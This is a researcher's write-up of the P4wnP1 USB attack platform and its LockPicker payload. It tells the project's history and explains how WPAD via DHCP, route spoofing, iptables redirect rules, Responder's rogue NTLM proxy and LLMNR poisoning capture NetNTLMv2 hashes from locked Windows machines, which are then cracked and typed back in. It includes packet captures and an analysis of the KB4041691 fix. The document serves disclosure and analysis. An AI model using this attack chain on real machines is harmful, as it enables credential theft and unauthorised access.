# History of P4wnP1, inner workings of LockPicker payload, network traffic analysis for the attack and quick look on KB4041691 (addressing the attack vector of LockPicker)

If you're only interested in the technical aspects, jump down to the respective sections!

## Genesis and development of P4wnP1 and the LockPicker payload

Back in September 2016 the following blog post came to my attention: 
["Snagging creds from locked machines"](https://room362.com/post/2016/snagging-creds-from-locked-machines/) by **Rob "Mubix" Fuller**. 

What Mubix described was disturbing, because it seems to be too easy to steal a hash from a locked Windows box. Giving it a shot was a good opportunity, to take a break from the "Penetration Testing With Kali Linux (PWK)" course, which I was into during that time. 

Small problem: Mubix used customizable USB devices, USB Amory or Hak5's LAN Turtle to be precise, which I couldn't get my hands on quickly. So I took 5 minutes and modified a rogue AP which I had ready for awareness trainings, in order to carry out the attack via WiFi (more on the attack chain later, but it essentially it doesn't matter if the network device in use is based on USB or something else). So I went on, locked down my Windows 10 box and connected to the prepared WiFi AP (from the lock screen). **BOOM**  ... about 10 seconds later a NetNTLMv2 hash of the (privileged) user I was working with was captured by the AP (salt was known).
I couldn't believe that this really happened. The blog post was online for several days, my box was fully patched, but it worked instantly and only took some seconds.

I was interested in what was happening here. To do some analysis I fired up a sniffer and deployed audit rules to get some insights in the processes and data exchange involved. With the system prepared for the new goal (find the root cause), I took a second attempt to capture the hash ... nothing ! No NetNTMLv2 hash captured.
A third attempt ... Nothing, no hash ! Fourth to tenth attempt - still nothing. 

Seems I was lucky at the first attempt, so I stopped doing research on that.

During the next 3 month I turned back to usual tasks like: Taking my OSCP exam, working to make my employer happy and become a father once more. In other words: I was busy with other things.

Although I was busy, one more blog post took my attention: This time it was [PoisonTap](https://samy.pl/poisontap/) by **Samy Kamkar**. 

Beside some neat techniques (like DNS rebinding, to access a victim's router configuration front-end webpage from the internal network, relayed through a web browser with poisoned webcache using a planted JavaScript backdoor ... pooh, long sentence ...). Samy used a cheap **Raspberry Pi Zero** to deploy the payload via **Ethernet over USB**. Up to this point I was using patched Android mobiles to deploy USB network attacks, but I wasn't aware of the fact that USB gadgets could be used with the RPi0.
 
Next logical step: I opened up a webbrowser and pressed the "order" button on a page selling the RPi0. Again I was out of luck trying to repeat this, the Pi0 could only be ordered once.


By the end of January 2017, I had the time to review the research of Mubix and SamyK and thus unboxed my RPi0, which was unused so far. I started to port the attack of Mubix to Raspbian and thought it could be a good idea to solve minor problems:
- deal with CDC ECM vs RNDIS setup (use the same DHCP configuration, no matter which device is activly used)
- modify Responder to make Microsoft connection tests succeed (Captive Portal detection), although the device has no upstream connection
- routing based redirection of every IPv4 address (refining of Samy's approach)
- change the USB gadget configuration in a way, which allows to emulate multiple devices without the need of additional driver installation or modifications on the target OS (PnP class drivers)

After tying everything together, I decided to share it with the InfoSec community and pushed everything to github. This was back on **February 23, 2017 - the birth of P4wnP1** (read: "Pwn Pi").

The projects consisted of two bash scripts, which reassembled the attack presented by Mubix, with some minor refinements.
Unfortunately carrying out the attack failed in most cases. To be more precise: It failed targeting Windows, but it succeeded on 3rd party tools like the Java Updater (at least if you manage to keep your  breath long enough while staring on a locked Windows screen waiting for a hash to arrive from Java Updater). The findings have been reported to Oracle and **CVE-2017-10125** assigned (disclosure timeline is still in project's README).

As the aim of P4wnP1's USB stack was to be able to bring up multiple USB devices at once, without the need of manual driver installation, a simple idea existed since starting the project: *Instead of storing the hash, the device could be used to cracked it and type it out to the target's lock screen.*
Anyway, I was done with stealing hashes from locked machines, because the success rate wasn't high - the only vendor I have found vulnerable received a report. This didn't hinder me from adding in support for HID keyboard emulation, about a week after P4wnP1's initial release. 

Obviously the RPi0 had great potential for use cases in pentests, while coming at very low costs. I wasn't really able to unfold this potential, when Hak5 introduced the BashBunny in March 2017.

Damn ... there's a device in USB flashdrive form factor, being able to do exactly the things P4wnP1 was intended to do! In fact it had much better specs than the RPi0 (color LED, SSD flash, Allwinner H3 based SoC). 
I felt there was no need for a project like P4wnP1 anymore, beside the fact that one could buy 20 RPi0 for the price of a single BashBunny. 

I looked destiny straight in the eye, opened up a webbrowser again and pressed the order button on Hak5's webshop to receive my BashBunny. Goodbye "P4wnP1" ... end of live reached after about a week of existence. 

You may have noticed: I was a bit frustrated. But the frustration ended abruptly, when availability of the Bluetooth and WiFi capable **Raspberry Pi Zero W** was announced during the same week. Once more I hit the order button. With Pi0W it was the old game again ... I could only order a single device, no matter how hard I tried. Seems I'm not able to complete repetetive tasks.

In March 2017 I stepped back from the project (reminder: there's still no LockPicker payload) and only added in minor improvements. The cause wasn't that I gave up on it, but when the Pi Zero W arrived, a new idea was planted which I wasn't able to get out of my head:

*I've got a cheap device which is able to emulate a bunch of USB peripherals and almost every possible USB HID interface, while being accessible via WiFi and Bluetooth. What if something like the keyboard LEDs could be used to built a covert channel in order to tunnel out IO from a shell running on a target and relay everything over WiFi or Bluetooth?*

What should I say, I ultimately jumped into prototyping for this idea. It took about a month till April 2017, till I had a PoC ready. The basic idea was implemented the other way around: An insider uses P4wnP1, attaches it to a Windows target and is able to communicate with a bash shell running on P4wnP1. The nice thing about this: On the target side (Windows) everything runs in-memory, based on PowerShell. No privileges are needed, no communication devices are spawned to talk to P4wnP1 ... only pure HID. The result was published and is called `HID frontdoor` today. 

While working on the HID channel I stumbled across several obstacles and in the end across the best research done in this field by **Sensepost**. Of course I was already aware of these guys (remember the rogue AP mentioned in the beginning? It was backed by "mana-toolkit"). But what I wasn't aware of their project [**Universal Serial Abuse**](https://sensepost.com/blog/2016/universal-serial-abuse/) (what a shame, because it was presented at [DEF CON 24](USaBUSe)).

I got in touch with **Rogan Dawes**. I don't know how to describe the conversation with my restricted English skills, maybe: *"a misuse of github issues for excessive inter-project discussions"* ?!

In the end I have to shout out **big thanks to Rogan**. I would have been able to bring up the covert channel myself, but without the ongoing exchange on this topic I would still be stuck on a transfer rate of 3.2KByte/s today. This isn't the case:

In July 2017, a full fledged Windows backdoor which communicates with the target using only pure HID was released. It could handle multiple channels, with transfer rates about 50KByte/s (60000 Byte/s is the theoretical maximum on USB 2.0 using this technique). Everything was based on a custom multi layer protocol stack and an RPC-like approach. 

In less technical terms: 
You could communicate with P4wnP1 from most WiFi or Bluetooth capable device equipped with a SSH client and pop multiple remote shells. The target only sees HID devices.

The final implementation of this new major feature is called `HID backdoor`, today. Some additional core features, which are used by the backdoor have been introduced to the project during this time:

- WiFi support
- DuckyScript parsing
- on-demand keyboard attacks, triggered via WiFi
- Payload system based on callback events (language bash)
- Payload branching, triggered by LEDs of the target's real keyboard
- status indication via LED
- etc.

A lot of effort has been put into this and everything was working nicely. During the next weeks, minor improvements have been introduce (like Bluetooth support, payload templates etc.). So P4wnP1 had its "reason for existence" and I was in good mood. In fact I was in such a good mood, that I decided to pull out my BashBunny, which was barely used so far, and do some tests for comparison with P4wnP1. To be honest, doing this put a smile in my face.
	
This smile didn't remain very long. It was washed away exactly at the point in time, when I fired BashBunny's "QuickCreds" payload (another implementation of the attack presented by Mubix) against my Windows 10 machine. About 30 seconds later the LED indicated a hash was grabbed. Checking it ... indeed the hash of the user I had a logon session with.

Damn! How could I have missed this? The whole P4wnP1 project was started to carry out this attack, but it never worked reliably. So what was wrong with my approach?
Once more, I tried to analyze what was happening, the smile went back to my face: It wasn't able to successfully carry out the attack a second time! Same problem I was facing with P4wnP1 several month, ago. I was convinced that the issue was fixed with MS16-112 up to this point, but BashBunny has proven that it was still alive and it only works under certain conditions (probable only if a network device is attached the first time).

Finally on August 1, 2017 the `LockPicker` payload was released. It reassembled all the ideas and findings. Including the early idea of cracking the hash on P4wnP1 itself and type it out to the target's lock screen, in order to ultimately unlock the box (which of course is more a PoC, as hash cracking with a Pi0 is far way from being an optimal setup). P4wnP1's final implementation of the attack was showcased by **Seytonic** in this [youtube video](https://www.youtube.com/watch?v=KDJKE10LCjM).


The payload was working reliably and I was a bit surprised to find Windows 10 itself being the root cause. This, unfortunately, was after releasing `LockPicker` and brought to Microsoft's attention on August 8, 2017.
The conversation with Microsoft revealed that I was badly mistaken, when taking the assumption that this issue was already addressed with MS16-112.

I hadn't done my homework very well, which isn't the best excuse for not respecting responsible disclosure. The impact, on the other hand, wasn't too high for the following reasons:

1. The issue was already well understood and for sure brought to Microsoft's attention before (Mubix disclosed the base idea about 11 month earlier)
2. Microsoft didn't consider this as security flaw, because the attack was carried out using physical access (10 immutable laws of security). In fact, they had to be convinced to review the issue, because the underlying attack vector is network based (remember the WiFi scenario of my initial test).

Microsoft finally informed me, that the issue is going to be fixed with the October patch for Windows 10. It was was released with KB4041691 on October 10, 2017.

The remaining sections describe the technical aspects of the attack. Let's start with the original approach presented by Mubix.

## Snaggin creds from locked machines by Rob "Mubix" Fuller

As the blog post which explains everything has been linked above, I don't get into details too much. This is the summary of the attack:

1. A new network device is deployed and runs a DHCP server which hands out leases to the target.
2. One of the DHCP options is a `Web Proxy Autodiscovery Protocol (WPAD)` entry (option 252). This entry promotes the URL on which the clients are able to receive a `Proxy-Auto-Configuration (PAC)` file. While WPAD could fill several text pages if considered as attack vector, some aspects are of importance here:
   - The WPAD entry delivered via DHCP has priority over WPAD entries deployed over DNS, from Windows perspective
   - The PAC script has to be fetched via HTTP by the client in order to use it
   - This means, a simple DHCP option could be used to induce the target OS to issue a HTTP request to an attacker controlled URL. At least Windows seems to be happy to do so in the end.
3. As the attacker is in control of the DHCP leases provided to the target, it isn't much of a problem to propagate a gateway or DNS server, in order to redirect HTTP requests to himself (the malicious network device). In fact this isn't needed at all, as the WPAD URL could use a host part, which directly points to the malicious device.
4. As every webserver can ask the HTTP client for authentication, Mubix uses Responder to do exactly this for incoming requests to the PAC file provided with the WPAD URL. In contrast to most public webservers, neither *BASIC AUTHENTICATION*, nor *DIGEST AUTHENTICATION* is used, but the rogue webserver is asking the client for *NTLM HTTP AUTHENTICATION*. This basically means, the webserver provides a challenge to the client, which is used along with the user's password to create an NTLMv2 hash. To be more precise, a NetNTLMv2 hash is created (a pure NTLM hash wouldn't contain a salt). Having a hash with salt renders PtH attacks or rainbow table cracking useless. Anyway, as Responder issued the challenge, the salt is known to the attacker and the password is crackable (depending on how strong it was chosen).
5. Windows tries to fetch the PAC file (even if the machine is locked) and happily sends the NetNTLMv2 hash for the currently active user logon session to the target.

Doing all of this takes less than a minute (including installing drivers for the malicious USB Ethernet device).

## Changes introduced to Mubix's attack in P4wnP1's LockPicker


### 1. Switching USB VID
The first change I introduced, was that every attack is carried out with a new USB device.

Based on my observations, carrying out the attack multiple times against the same target with the same device doesn't work well. I haven't done in-depth analysis on the cause, but it seems Windows stores proxy settings for formerly seen networks in registry. Changing USB settings like USB PID and VID, while still being able to use Windows Plug and Play class drivers for USB RNDIS networking, was one of the early tasks of P4wnP1. This essentially allows to chose a **random USB PID** on every boot, which in the end makes Windows believe that it has to deal with a new USB Ethernet device which is unknown so far (no matter how often it is used, unless the randomly chosen PID collides with a PID used earlier).

### 2. No authentication on WPAD URL

Instead of forcing the client to authenticate against the WPAD URL, the PAC script is delivered without further authentication. This allows the client to issue HTTP CONNECT requests against a HTTP proxy, which is propagated in the PAC script. The HTTP proxy now asks for the NTLM authentication, when the client requests a web resource from the proxy via HTTP CONNECT. It is worth mentioning, that the tool used to accomplish this task was Responder and that the feature of delivering the PAC file without authentication was requested by somebody well-known in 2012: [Mubix](https://github.com/SpiderLabs/Responder/issues/4)

### 3. Intercepting almost every public IPv4 address

The DHCP server running on P4wnP1 propagates two static routing entries:
- `0.0.0.0/1` gateway P4wnP1 IP
- `128.0.0.0/1` gateway P4wnP1 IP

From client perspective there are two new known networks, which wrap up the IPv4 range.
This means: For none of the possible target IPs the system's default gateway has to be used, because a more specific route exists, pointing to P4wnP1. Every packet destinated to an IP address in this range (except the ones for private networks which have a more specific route on the target) gets delivered to P4wnP1. Up to this point, this is exactly the approach used by Samy Kamkar with PoisontTap, but one thing is missing so far:
The packets are received by P4wnP1, but destinated to a foreign IP. Even if IPv4 forwarding would have been enabled, we haven't got an upstream connection, which could be used to deliver the packets (at least with this P4wnP1 payload ;-) ).

This last problem is solved with a simple iptables rule, which redirects every UDP and TCP packet destinated to the outside (hits the PREROUTING chain of the NAT table) back to P4wnP1:

```
iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
```

As shown in the iptables rules above, multicast and broadcast addresses are excluded. Multicast LLMNR requests, for example, are fetched by Responder in order to poison this type of name resolution (and as a result redirect traffic to P4wnP1's IP).

So why has this been done, anyway? Now, as the attack is backed by Responder authentication could be forced on a bunch of other services by this tool (FTP, SMB, HTTP etc.). We only assure that Responder is able to receive every possible request.

It should be noted, that the target isn't able to connect to any public service while doing this, as essentially everything ends up being fetched by Responder. So these settings are only used in this special P4wnP1 payload and considered demystified now (I received several requests for explanation of the respective payload options):
- the `WPAD_ENTRY` option enables propagation of a WPAD URL pointing to P4wnP1's IP via DHCP
- the `ROUTE_SPOOF` option enables propagation of the two routes highlighted above via DHCP

Why was I doing that ? Consider the following scenario:

We try to force Windows to send an NTLM authenticated HTTP CONNECT request to P4wnP1, where Responder is waiting to receive such an request on its rogue HTTP Proxy (to grab the hash). If this won't happen, there's still a chance some 3rd party software is issuing such an authenticated request. If the 3rd party software respects the systems proxy settings, we are fine - everything would work as intended and the hash would end up at Responder. If the 3rd party software disrespects the proxy and sends a HTTP request to a hard coded public IP, the outbound packet would match one of the two routes given above and ultimately being send to P4wnP1 (acting as gateway for the two routes). P4wnP1 now redirects the packet (meant to be routed outwards) to itself, where it ends up at Responders rouge HTTP server again. Authentication is requested once more and a hash could be grabbed. 

Why a "hard coded" IP ? Only to explain the behavior, if the client tries to resolve the IP via DNS, the result would end directly at the P4wnP1 IP, because Responder runs a rogue DNS server (which has been propagated via DHCP). Additionally we are talking about a scenario where a USB Ethernet device gets attached to a target machine, which already had network access - for sure some DNS queries have already been resolved and the IPs ended up in DNS cache. We owe these remote IPs now.


One more thing should be mentioned according the example above: Instead of forcing authentication on pure HTTP GET requests, Responder could be tuned to deliver a default HTTP response. This again could be used to deliver a webpage with a HTML element pointing to a source like `file://p4wnp1_ip/something`. Depending on the browser settings, this would force an SMB request to the UNC path used. The SMB request again ends up on Responder which forces NTLM authentication on the faked SMB share.

Oh ... how could I forget - if you're curious why Responder could force authentication on HTTP, but deliver a response in case the WPAD config is requested ... this was another small modification I introduced to Responder for testing purposes.

To summarize:
The changes introduced are raising the chances to grab a hash in ways differing from the one intended initially.



### 4. Passing MSFT connect tests

This isn't exactly a change used by this payload (it wasn't needed), but a feature introduced to the modified Responder.
Windows does some DNS and HTTP requests to well known URLs with predefined content, in order to determine if Internet access is available (this is for example used for captive portal detection). In an early phase of the project, I thought it would be a good idea to make Windows believe it is online, although every communication ends up at P4wnP1. It turns out that this isn't needed to carry out the attack, as the needed HTTP CONNECT requests are issued by Windows, even if the connect tests failed. So this isn't used by the payload, but the feature exists.

### 5. Grabbing the hash from Responder's SQLLite DB

Instead of trying to rip out a captured hash from one of the log files produced by Responder, the hashes are directly exported from the SQLite database used by Responder. This has several advantages: The most important one is, that the needed SQL query could be used to filter out false positives.

What are false positives ?

As mentioned there exists 3rd party software, which is pleased to provide some hashes to Responder. Unfortunately, these hashes couldn't always be used, because they don't represent a logon session. I don't comment on what Software I'm talking about, but if you take a closer look on the payload you could see which hashes I wasn't interested in.

### 6. Storing, cracking, typing out

There's not much to say about this. P4wnP1's ships with a pre-compiled version of John the Ripper (JtR) Jumbo. If you throw JtR Jumbo against a file with NetNTLMv2 hashes without changing its default settings, it will try to crack in so called "batch mode". This means: JtR starts with a dictionary attack (dictionary of about 30000 weak credentials packed with JtR Jumbo) and goes on with pattern based bruteforcing until it is stopped by someone or the hash has been cracked.

Now `LockPicker` waits till JtR succeeds (of course a grabbed hash is stored internally before doing so, so one could walk away with it and go on with offline cracking).
On success the payload stores the plain password for later use and hands it over to the emulated HID keyboard which types it out to ultimatly unlock the box.

In order to do so, two conditions have to be met (beside the password being weak enough to get cracked):
- The language setting of the payload has to match the target's keyboard language layout
- The plain password must only consist of ASCII chars, only. This is due to the fact, that P4wnP1's internal keyboard implementation interprets ASCII input only (which is fine for being DuckyScript compatible, but not enough to type out unicode chars from different languages)

### Conclusion

The extensions mentioned made the attack pretty much reliable and produce at least a stored hash in nearly every case. 


## Root cause analysis / Microsoft Patch

As already mentioned, I didn't put enough effort into this. For instance I didn't analyze which binaries are involved (although I got a rough picture on the Windows services accessing the rogue HTTP proxy). I was focused on analyzing the network traffic. Doing this, it became pretty clear that the service which sent out the hashes was belonging to Windows 10 itself. When recognizing this, I reported to Microsoft without further delays. There hasn't been a CVE assigned, because this case was considered as *"part of an overall hardening effort for NTLM"* by Microsoft. For this reason I don't provide a disclosure timeline in this writeup. In the end it is important to know, that Microsoft addressed the issue with KB4041691 on October 10, 2017.

The following questions haven't been answered by Microsoft (or have been answered with *"no comment"*):


1) Is the patch going to prevent 3rd party tools from leaking NTLM hashes from locked machines (like the Java JRE updater problem mentioned in the projects README) ?
2) How is the problem addressed on Windows 7, it was proven vulnerable to the same attack in most of my tests ?
3) "hardening effort for NTLM" is a term leaving much room for interpretation. Does it refer to measures against leaking of hashes or using them for authentication (like PtH attacks or attacks against TGT/TGS combined with kerberos RC4 downgrade). I doubt you're referring the latter, as the case was related to NetNTLMv2 not to NTLM(v2). So could you please be more precise on "hardening effort for NTLM"?

### Relevant Network communication on a System without patch applied

#### 1. DHCP (Discover, Offer, Request, Ack)

Here the DHCP Offer is of interest:

```
Bootstrap Protocol (Offer)
... snip ...
    Your (client) IP address: 172.16.0.2
    Next server IP address: 172.16.0.1
... snip ...
    Option: (54) DHCP Server Identifier
        Length: 4
        DHCP Server Identifier: 172.16.0.1
... snip ...
    Option: (252) Private/Proxy autodiscovery
        Length: 26
        Private/Proxy autodiscovery: http://172.16.0.1/wpad.dat
    Option: (249) Private/Classless Static Route (Microsoft)
        Length: 12
         0.0.0.0/1-172.16.0.1
         128.0.0.0/1-172.16.0.1
    Option: (121) Classless Static Route
        Length: 12
         0.0.0.0/1-172.16.0.1
         128.0.0.0/1-172.16.0.1
    Option: (44) NetBIOS over TCP/IP Name Server
        Length: 4
        NetBIOS over TCP/IP Name Server: 172.16.0.1
    Option: (6) Domain Name Server
        Length: 4
        Domain Name Server: 172.16.0.1
    Option: (3) Router
        Length: 4
        Router: 172.16.0.1
... snip ...
```

The excerpt from above highlight the points already discussed (static IPv4 routes + URL to PAC script).

#### 2. Request to PAC file on provided WPAD URL

```
GET /wpad.dat HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: WinHttp-Autoproxy-Service/5.1
Host: 172.16.0.1

HTTP/1.1 200 OK
Server: Microsoft-IIS/7.5
Date: Thu, 03 Aug 2017 14:53:25 GMT
Content-Type: application/x-ns-proxy-autoconfig
Content-Length: 333

function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || (host == "10.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return "PROXY authtome:3128; DIRECT";}
```

The snippet above shows how a Windows requests the propagated PAC file with a service using the user agent `WinHttp-Autoproxy-Service/5.1`.

Additionally it is shown that this request succeeds (no authentication requested) and a PAC script is delivered, which advices the HTTP clients to use the WebProxy at `authtome:3128` for every connection which isn't directed to `localhost` or `10.0.0.1`.

As `authtome` isn't a known host, the client is forced to resolve the name (LLMNR, NBNS, DNS). It would have been easier to supply the P4wnP1 IP directly, but responder is answering name resolution requests anyway (so this wasn't needed and never changed).


#### 3. Name Resolution via LLMNR

```
Internet Protocol Version 4, Src: 172.16.0.1, Dst: 172.16.0.2
User Datagram Protocol, Src Port: 5355, Dst Port: 51442
Link-local Multicast Name Resolution (response)
... snip ...
    Queries
        authtome: type A, class IN
            Name: authtome
            [Name Length: 8]
            [Label Count: 1]
            Type: A (Host Address) (1)
            Class: IN (0x0001)
    Answers
        authtome: type A, class IN, addr 172.16.0.1
            Name: authtome
            Type: A (Host Address) (1)
            Class: IN (0x0001)
            Time to live: 30
            Data length: 4
            Address: 172.16.0.1
```

The snippet shows the response of Responder for the LLMNR based name resolution request for `authtome`. So `authme` is now tied to P4wnP1's IP.
This "namespoofing" actually isn't a needed part to make the hash stealing attack work. I included it to highlight that the goal could be achieved using other spoofing / redirection / MitM attacks. 

Why ? Because even Microsoft asked for clarification on how this vector could be exploited network based (remember, conflict with #3 of "10 Immutable Laws Of Security"), without attaching an USB device. Of course there are many ways to grab a NetNTLM(v2) hash network based, especially when Responder joins the game. I'm also aware of the fact, that is doesn't matter if the boxes spitting out hashes are locked during an engagement, when network access is granted - but in this context it should matter (Keep WiFi based attacks in mind - Evil Twin, Karma APs etc.).

#### 4. CONNECT request on proxy (authtome:3128)

```
 ... snip ...
Internet Protocol Version 4, Src: 172.16.0.2, Dst: 172.16.0.1
Transmission Control Protocol, Src Port: 50286, Dst Port: 3128, Seq: 1, Ack: 1, Len: 103
Hypertext Transfer Protocol
    CONNECT v10.vortex-win.data.microsoft.com:443 HTTP/1.1\r\n
    Host: v10.vortex-win.data.microsoft.com:443\r\n
    \r\n
    [Full request URI: v10.vortex-win.data.microsoft.com:443]
```

The snippet shown above shows one of the early CONNECT requests to our proxy for a well known domain. Additionally it showcases another advantage of using a proxy over using a webserver, when it comes to traffic analysis: In contrast to a normal HTTP GET request, a CONNECT request contains a complete URI, because the proxy isn't DNS aware. In other words, you don't need to correlate to DNS requests.

Let's look have a look into the content of the answer:

```
HTTP/1.1 407 Unauthorized
Server: Microsoft-IIS/7.5
Date: Thu, 03 Aug 2017 14:53:25 GMT
Content-Type: text/html
Proxy-Authenticate: NTLM
Proxy-Connection: close
Cache-Control: no-cache
Pragma: no-cache
Proxy-Support: Session-Based-Authentication
Content-Length: 0
```

The proxy responds with a 407 and requests NTLM authentication!

#### 5. Next CONNECT request (NTLMSSP negotiation + challenge)

```
Internet Protocol Version 4, Src: 172.16.0.2, Dst: 172.16.0.1
Transmission Control Protocol, Src Port: 50287, Dst Port: 3128, Seq: 1, Ack: 1, Len: 187
Hypertext Transfer Protocol
    CONNECT v10.vortex-win.data.microsoft.com:443 HTTP/1.1\r\n
    Host: v10.vortex-win.data.microsoft.com:443\r\n
    Proxy-Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAKADk4AAAADw==\r\n
        NTLM Secure Service Provider
            NTLMSSP identifier: NTLMSSP
            NTLM Message Type: NTLMSSP_NEGOTIATE (0x00000001)
            Negotiate Flags: 0xa2088207, Negotiate 56, Negotiate 128, Negotiate Version, Negotiate Extended Security, Negotiate Always Sign, Negotiate NTLM key, Request Target, Negotiate OEM, Negotiate UNICODE
            Calling workstation domain: NULL
            Calling workstation name: NULL
            Version 10.0 (Build 14393); NTLM Current Revision 15
    \r\n
    [Full request URI: v10.vortex-win.data.microsoft.com:443]
```

The new CONNECT request shown above starts the NTLM negotiation with data provided by the Windows "Security Support Provider (SSP)"

```
    HTTP/1.1 407 Unauthorized\r\n
    Server: Microsoft-IIS/7.5\r\n
    Date: Thu, 03 Aug 2017 14:53:25 GMT\r\n
    Content-Type: text/html\r\n
     [truncated]Proxy-Authenticate: NTLM TlRMTVN ... snip ... wADMALgBzAG0AYg
        NTLM Secure Service Provider
            NTLMSSP identifier: NTLMSSP
            NTLM Message Type: NTLMSSP_CHALLENGE (0x00000002)
            Target Name: SMB
            Negotiate Flags: 0xa2890205, Negotiate 56, Negotiate 128, Negotiate Version, Negotiate Target Info, Negotiate Extended Security, Target Type Domain, Negotiate NTLM key, Request Target, Negotiate UNICODE
            NTLM Server Challenge: e45117cfa5e7264c
            Reserved: 0000000000000000
            Target Info
            Version 5.2 (Build 3790); NTLM Current Revision 15
    Content-Length: 0\r\n
    \r\n
```

Again Responder send back a 407 to the negotiation request, but instead of a `Proxy-Connection: close` header like in the last response, a CHALLENGE is sent to the client.
As the challenge is produced by responder, it is known to the attacker and could be used to crack the resulting NTLM hash. 
So the last part of the puzzle is the NTLMSSP_AUTH response, which we await to receive for our challenge. The NTLMSSP_AUTH should contain the NetNTLMv2 hash.

#### 6. Receiving the NTLMSSP_AUTH (empty)

```
Hypertext Transfer Protocol
    CONNECT v10.vortex-win.data.microsoft.com:443 HTTP/1.1\r\n
    Host: v10.vortex-win.data.microsoft.com:443\r\n
    Proxy-Authorization: NTLM TlRMTV ...snip ... BJAAA=\r\n
        NTLM Secure Service Provider
            NTLMSSP identifier: NTLMSSP
            NTLM Message Type: NTLMSSP_AUTH (0x00000003)
            Lan Manager Response: 00
            NTLM Response: Empty
            Domain name: NULL
            User name: NULL
            Host name: DESKTOP-4CDILFI
            Session Key: Empty
... snip ...
```

The HTTP payload above is an excerpt from the NTLMSSP_AUTH received from the service requesting `CONNECT v10.vortex-win.data.microsoft.com:443`. 

The nice thing about this is that both, `USER name` and `NTLM Response` are empty. So the attacker isn't able to receive a hash.

It is worth mentioning, that the same happens with a bunch of other services, among others the connection tests (e.g. `http://www.msftconnecttest.com/connecttest.txt` for Windows 10). Additionally it is worth mentioning that although connection tests respect the proxy, they use a `HTTP GET` request instead of a `HTTP CONNECT` (maybe part of connection testing together with neat things like STUN). One thing I was curious about is that, although all connection tests failed, Windows doesn't give up on requesting `v10.vortex-win.data.microsoft.com`. Interpretation of this agressive behavior is left to the reader.

The most curious thing is pointed out under the next heading:

#### 7. Receiving the NTLMSSP_AUTH from a chatty service

```
Hypertext Transfer Protocol
    GET http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/authrootstl.cab?a37ed22714196257 HTTP/1.1\r\n
    Proxy-Connection: Keep-Alive\r\n
    Accept: */*\r\n
    User-Agent: Microsoft-CryptoAPI/10.0\r\n
    Host: ctldl.windowsupdate.com\r\n
     [truncated]Proxy-Authorization: NTLM TlRMTVNT ... snip ... QA0AEMAR
        NTLM Secure Service Provider
            NTLMSSP identifier: NTLMSSP
            NTLM Message Type: NTLMSSP_AUTH (0x00000003)
            Lan Manager Response: 000000000000000000000000000000000000000000000000
            LMv2 Client Challenge: 0000000000000000
            NTLM Response: 5895b13976 ... snip ...
            Domain name: DESKTOP-4CDILFI
            User name: unpriv
            Host name: DESKTOP-4CDILFI
            Session Key: Empty
   \r\n
    [Full request URI: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/authrootstl.cab?a37ed22714196257]
```

The NTLMSSP_AUTH shown above is produced by a ** service vulnerable to the attack** (negotiation and challenge are left out, but follow the principals introduced before).

Some things have changed:
1. A User-Agent header was introduced, allowing a very, very, very rough guess on the service producing this **`User-Agent: Microsoft-CryptoAPI/10.0`**
2. The request URI (GET request), allows a very rough guess on the application being responsible for this request **`... http://ctldl.windowsupdate.com/ ...`** (questions like, why is this plain HTTP are out of scope)
3. A **username** and **NTLM Response** have been provided 

So at this point we have a valid NetNTLMv2 hash, along with the challenge which is enough for cracking.

It should be noted that the test system wasn't domain joined !!!

### Relevant Network communication on a System patched with KB4041691


```
Hypertext Transfer Protocol
    CONNECT fe2.update.microsoft.com:443 HTTP/1.1\r\n
    Host: fe2.update.microsoft.com:443\r\n
    Proxy-Authorization: NTLM TlRMTVNTUAAD ...snip... BJAEwARgBJAAA=\r\n
        NTLM Secure Service Provider
            NTLMSSP identifier: NTLMSSP
            NTLM Message Type: NTLMSSP_AUTH (0x00000003)
            Lan Manager Response: 00
            NTLM Response: Empty
            Domain name: NULL
            User name: NULL
            Host name: DESKTOP-4CDILFI
            Session Key: Empty
            Negotiate Flags: 0xa2880a05, Negotiate 56, Negotiate 128, Negotiate Version, Negotiate Target Info, Negotiate Extended Security, Negotiate Anonymous, Negotiate NTLM key, Request Target, Negotiate UNICODE
            Version 10.0 (Build 14393); NTLM Current Revision 15
... snip ...


Hypertext Transfer Protocol
    CONNECT sls.update.microsoft.com:443 HTTP/1.1\r\n
    Host: sls.update.microsoft.com:443\r\n
    Proxy-Authorization: NTLM TlRMTVNT ... snip ... ARgBJAAA=\r\n
        NTLM Secure Service Provider
            NTLMSSP identifier: NTLMSSP
            NTLM Message Type: NTLMSSP_AUTH (0x00000003)
            Lan Manager Response: 00
            NTLM Response: Empty
            Domain name: NULL
            User name: NULL
            Host name: DESKTOP-4CDILFI
            Session Key: Empty
            Negotiate Flags: 0xa2880a05, Negotiate 56, Negotiate 128, Negotiate Version, Negotiate Target Info, Negotiate Extended Security, Negotiate Anonymous, Negotiate NTLM key, Request Target, Negotiate UNICODE
            Version 10.0 (Build 14393); NTLM Current Revision 15
... snip ...
```

I left out most of the thing already explained. The two HTTP payloads shown above are NTLMSSP_AUTH responses to new update URIs. Both arrived at the rogue proxy (among with other requests already discussed). **None of the NTLMSSP_AUTH packages seen on the test system contained a `NTLM Response` or `User name`**. A request from a service with user agent `Microsoft-CryptoAPI/10.0` or a request targeting `http://ctldl.windowsupdate.com` hasn't been spotted in my tests.

### Conclusion

The issue spotted and reported to Microsoft seems to be patched. I haven't done further research on the following aspects (and I won't do it):

- identifying the binary responsible for delivering the hashes on an unpatched system
- binary diffing the patch
- testing on Windows 7
- testing on domain joined machines
- not verified that 3rd party applications aren't able to send NTLMSSP_AUTHs with valid hashes from locked machines

## Credits

- Rogan Dawes + Sensepost
- Rob "Mubix" Fuller
- Seytonic
- Samy Kamkar
- Microsoft (MSRC + Nate)
- lgandx (+ SpiderLabs for Responder)

Every supporter of P4wnP1 and the growing Github community
